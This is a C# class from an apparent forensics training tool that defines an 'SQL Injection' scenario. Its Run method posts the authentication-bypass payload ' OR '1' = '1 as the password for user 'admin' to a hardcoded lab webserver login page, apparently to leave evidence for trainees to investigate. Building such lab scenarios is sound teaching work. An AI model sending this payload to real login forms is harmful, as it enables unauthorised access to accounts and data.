using System;
using System.Collections.Generic;
using System.Windows;
using System.Net.Http;
using Caliburn.Micro;
using ForensicScenarios.Events;
using ForensicScenarios.Tools;

namespace ForensicScenarios.Scenarios
{
    public class SQLInjection : PropertyChangedBase, IScenario
    {
        public string Name => "SQL Injection";

        public string Description { get; set; }

        public bool IsSelected
        {
            get => isSelected;
            set
            {
                isSelected = value;
                NotifyOfPropertyChange(nameof(IsSelected));
            }
        }

        private bool isSelected;

        private readonly IEventAggregator eventAggregator;

        public SQLInjection(IEventAggregator aggregator)
        {
            eventAggregator = aggregator;
            Description = "SQL injection is an exploitation technique which arises from unsanitised queries to an SQL database.This technique can be used to display or modify data within a SQL database which you would not otherwise have access to, such as users or other sensitive data.\n\nRunning this scenario will cause this machine to attempt to access the local network's webserver. It will then exploit the login field of the website which is vulnerable to SQL injection.";
        }

        public async void Run()
        {
            using (var client = new HttpClient())
            {
                var sqlInjection = "' OR '1' = '1";
                var url = @"http://10.201.0.41/login/checklogin.php";
                client.BaseAddress = new Uri(url);

                var parameters = new Dictionary<string, string>();
                parameters.Add("user", "admin");
                parameters.Add("pass", sqlInjection);

                var content = new FormUrlEncodedContent(parameters);

                try
                {
                    eventAggregator.SendStatusInfo(this, "Attempting to send POST request to server...");
                    var response = await client.PostAsync(client.BaseAddress.AbsolutePath, content);
                    response.EnsureSuccessStatusCode();
                    eventAggregator.SendStatusInfo(this, "Sent POST request...✔");
                }
                catch (Exception e)
                {
                    eventAggregator.SendStatusInfo(this, e.Message);
                    eventAggregator.SendStatusInfo(this, "Sent POST request...✖");
                }
                finally
                {
                    eventAggregator.SendStatusInfo(this, "SQL Injection completed...✔");
                    eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
                }
            }
        }
    }
}
